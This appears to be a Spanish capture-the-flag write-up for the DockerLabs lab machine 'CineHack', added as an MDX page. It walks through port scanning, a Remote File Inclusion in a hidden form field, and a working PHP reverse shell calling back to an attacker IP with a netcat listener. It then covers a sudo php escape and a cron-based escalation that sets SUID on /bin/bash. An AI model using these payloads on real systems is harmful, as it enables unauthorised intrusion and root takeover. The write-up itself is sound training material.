@@ -1,0 +1,252 @@
+---
+title: CineHack
+description: Resolución completa de la máquina virtual *CineHack* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **CineHack**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web que, tras la configuración del dominio `cinema.dl`, revela un formulario con un campo oculto vulnerable a **Remote File Inclusion (RFI)**. Mediante la modificación de este campo, se logra la inclusión de una reverse shell alojada en el servidor atacante, obteniendo acceso como `www-data`.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `php` como el usuario `boss`. Desde esta cuenta, se encuentra una tarea cron que ejecuta un script en `/tmp/` como root. Al crear un script malicioso en esa ubicación, se obtiene acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'CineHack',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '17/10/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip CineHack.zip
+sudo bash auto_deploy.sh CineHack.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p CineHack/{content,exploits,nmap,scripts}
+cd CineHack
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1766088593/Ports_ullxrr.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+El sitio web inicialmente muestra contenido incompleto. Analizando el código fuente se identifica el dominio `cinema.dl`. Se agrega al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 cinema.dl" | sudo tee -a /etc/hosts
+```
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1765996926/Feroxbuster_sidiy6.png)
+
+**Rutas relevantes:**
+- `/index` — Página principal.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1766088593/Index_ipwznb.png)
+- `/reserva.html` — Formulario de reservaciones.
+  ![Reserva](https://res.cloudinary.com/dewqswzke/image/upload/v1766088593/Reserva_nrtfmv.png)
+
+### 1.4 Análisis del código fuente
+
+En el código HTML de `/reserva.html`, se encuentra un campo oculto `problem_url`:
+
+![Problem URL](https://res.cloudinary.com/dewqswzke/image/upload/v1766088593/Problem_url_yjiwiz.png)
+
+Se modifica el atributo `type` de `hidden` a `text`:
+
+```html
+<input type="text" name="problem_url" value="https://example.com/solution.txt">
+```
+
+![Form update](https://res.cloudinary.com/dewqswzke/image/upload/v1766088593/FormUpdate_gxea8c.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Remote File Inclusion
+
+Se crea un archivo `shell.php` con una reverse shell:
+
+```php
+<?php
+$ip = "172.17.0.1";
+$port = 443;
+$shell = "/bin/bash";
+
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if(!$sock) { die("Error de conexión: $errstr ($errno)"); }
+$descriptorspec = array(0 => $sock, 1 => $sock, 2 => $sock);
+$process = proc_open($shell, $descriptorspec, $pipes);
+proc_close($process);
+?>
+```
+
+Se inicia un servidor HTTP en la máquina atacante:
+
+```bash
+python3 -m http.server 80
+```
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se accede al endpoint vulnerable:
+
+```
+http://cinema.dl/reservation.php?problem_url=http://172.17.0.1/shell.php
+```
+
+Se descubre el directorio `/andrewgarfield/` y se accede al archivo subido:
+
+```
+http://cinema.dl/andrewgarfield/shell.php
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1766088594/ReverseShell_os1oqx.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → boss
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1766088598/Sudo-lwww-data_opncew.png)
+
+Se puede ejecutar `php` como `boss`:
+
+```bash
+sudo -u boss php -r "system('/bin/bash');"
+```
+
+![Boss](https://res.cloudinary.com/dewqswzke/image/upload/v1766088593/Boss_o6t1xq.png)
+
+### 3.2 De boss → root
+
+Se enumeran procesos y tareas programadas:
+
+```bash
+ps aux | grep cron
+ls -la /var/spool/cron/
+```
+
+Se encuentra una tarea cron que ejecuta `/tmp/script.sh` como root:
+
+![Cron](https://res.cloudinary.com/dewqswzke/image/upload/v1766088593/Cron_jmy21t.png)
+
+Se crea un script malicioso en `/tmp/script.sh`:
+
+```bash
+echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /tmp/script.sh
+chmod +x /tmp/script.sh
+```
+
+Tras esperar a que el cron se ejecute:
+
+```bash
+bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1766088597/Root_vaffl0.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Remote File Inclusion (RFI) en parámetro problem_url",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en php",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario boss"
+    },
+    {
+      vulnerability: "Tarea cron con path traversal y falta de validación",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    },
+    {
+      vulnerability: "Exposición de información sensible en código HTML",
+      severity: "Baja",
+      impact: "Facilitación del ataque"
+    }
+  ]}
+/>
